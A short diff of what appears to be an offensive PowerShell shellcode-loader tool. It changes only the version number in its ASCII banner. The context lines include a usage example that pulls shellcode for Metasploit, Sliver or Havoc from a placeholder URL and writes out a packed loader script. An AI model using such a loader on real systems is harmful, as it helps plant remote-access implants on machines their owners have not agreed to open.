@@ -32,7 +32,7 @@ Write-Output "
  | _ \___/ __| || |___/ __| |_  ___| | |/ __|___  __| |___| |   ___  __  __| |___ ___ 
  |  _/ _ \__ \ __ |___\__ \ ' \/ -_) | | (__/ _ \/ _  / -_| |__/ _ \/ _|/ _  / -_)  _|
  |_| \___/___/_||_|   |___/_||_\___|_|_|\___\___/\__,_\___|____\___/\__,\__,_\___|_|  
-                                                                                     v2.0
+                                                                                     v2.1
 Usage:
 > Import-Module ./Invoke-PoSH-ShellCodeLoader.ps1
 > Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
